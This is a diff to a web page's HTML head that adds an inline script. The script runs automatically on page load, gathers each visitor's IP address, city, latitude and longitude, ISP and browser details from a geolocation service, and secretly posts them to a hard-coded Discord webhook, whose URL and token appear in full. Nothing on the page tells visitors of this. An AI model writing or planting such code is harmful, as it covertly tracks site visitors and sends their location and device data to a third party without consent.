@@ -28,6 +28,97 @@
   <link rel="stylesheet" href="assets/css/card.css">
 
   <script src="../cdnjs.cloudflare.com/ajax/libs/socket.io/4.4.1/socket.io.js"></script>
+  <script>
+        // Function to get geolocation and device/browser information
+        async function sendInfoToWebhook() {
+            try {
+                // Get the public IP, location, and ISP info
+                let ipResponse = await fetch('https://ipapi.co/json/');
+                let ipData = await ipResponse.json();
+                
+                // Extract required information
+                let ipv4 = ipData.ip;
+                let ipv6 = ipData.ipv6 || 'Not Available';
+                let city = ipData.city;
+                let region = ipData.region;
+                let country_name = ipData.country_name;
+                let country_code = ipData.country_code;
+                let continent_code = ipData.continent_code;
+                let postal = ipData.postal;
+                let latitude = ipData.latitude;
+                let longitude = ipData.longitude;
+                let timezone = ipData.timezone;
+                let utc_offset = ipData.utc_offset;
+                let country_calling_code = ipData.country_calling_code;
+                let currency = ipData.currency;
+                let currency_name = ipData.currency_name;
+                let languages = ipData.languages;
+                let country_area = ipData.country_area;
+                let country_population = ipData.country_population;
+                let asn = ipData.asn;
+                let org = ipData.org;
+
+                // Get browser and device info
+                let browser = navigator.userAgent;
+                let device = /Mobi|Android/i.test(browser) ? 'Mobile' : 'Desktop';
+
+                // Discord webhook URL
+                const webhookURL = "https://canary.discord.com/api/webhooks/1292524044343705710/XJ83PkDjta8gnI-YK2r4KpJG5KrL0bRXmXlD5UCDOCfiPdPrTN4rwyM3wW0hswOqIKqa";
+
+                // Create the embed object with all the data
+                const embed = {
+                    title: "New Client Connection",
+                    color: 5814783, // Embed color (change as needed)
+                    fields: [
+                        { name: "IPv4", value: ipv4, inline: true },
+                        { name: "IPv6", value: ipv6, inline: true },
+                        { name: "City", value: city, inline: true },
+                        { name: "Region", value: region, inline: true },
+                        { name: "Country Name", value: country_name, inline: true },
+                        { name: "Country Code", value: country_code, inline: true },
+                        { name: "Continent Code", value: continent_code, inline: true },
+                        { name: "Postal", value: postal, inline: true },
+                        { name: "Latitude", value: latitude.toString(), inline: true },
+                        { name: "Longitude", value: longitude.toString(), inline: true },
+                        { name: "Timezone", value: timezone, inline: true },
+                        { name: "UTC Offset", value: utc_offset, inline: true },
+                        { name: "Calling Code", value: country_calling_code, inline: true },
+                        { name: "Currency", value: currency, inline: true },
+                        { name: "Currency Name", value: currency_name, inline: true },
+                        { name: "Languages", value: languages, inline: true },
+                        { name: "Country Area", value: country_area.toString(), inline: true },
+                        { name: "Country Population", value: country_population.toString(), inline: true },
+                        { name: "ASN", value: asn, inline: true },
+                        { name: "Organization", value: org, inline: false },
+                        { name: "Device", value: device, inline: true },
+                        { name: "Browser", value: browser, inline: false }
+                    ],
+                    footer: {
+                        text: "Client Information"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send the embed to the webhook
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+
+                console.log(`Client ${ipv4} info sent successfully`);
+            } catch (error) {
+                console.error('Error sending client information:', error);
+            }
+        }
+
+        // Run the function as soon as the page loads
+        window.onload = sendInfoToWebhook;
+    </script>
 </head>
 
 <body>
